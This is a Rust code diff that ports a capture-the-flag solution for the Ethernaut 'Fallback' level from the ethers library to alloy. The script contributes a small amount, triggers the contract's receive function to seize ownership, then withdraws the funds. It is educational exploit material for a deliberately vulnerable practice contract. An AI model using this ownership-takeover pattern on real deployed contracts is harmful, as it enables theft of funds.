@@ -1,6 +1,6 @@
+use alloy::{primitives::U256, rpc::types::TransactionRequest};
 use async_trait::async_trait;
 use ctf::ethernaut::lvl01_fallback::*;
-use ethers::prelude::*;
 
 pub(crate) struct Exploit;
 
@@ -13,22 +13,29 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
-        let contract = Fallback::new(target.address, offender.clone());
+        let contract = Fallback::new(target.address, offender);
 
         println!("Calling contribute()...");
-        contract.contribute().value(1).send().await?.await?;
+        let receipt = contract
+            .contribute()
+            .value(U256::from(1))
+            .send()
+            .await?
+            .get_receipt()
+            .await?;
+        println!("Contribute tx: {:?}", receipt.transaction_hash);
 
         println!("Calling receive()...");
-        offender
-            .send_transaction(
-                TransactionRequest::new().to(contract.address()).value(1),
-                None,
-            )
-            .await?
-            .await?;
+        let tx = TransactionRequest::default()
+            .to(contract.address())
+            .value(U256::from(1));
+        let receipt =
+            offender.send_transaction(tx).await?.get_receipt().await?;
+        println!("Receive tx: {:?}", receipt.transaction_hash);
 
         println!("Calling withdraw()...");
-        contract.withdraw().send().await?.await?;
+        let receipt = contract.withdraw().send().await?.get_receipt().await?;
+        println!("Withdraw tx: {:?}", receipt.transaction_hash);
 
         Ok(())
     }
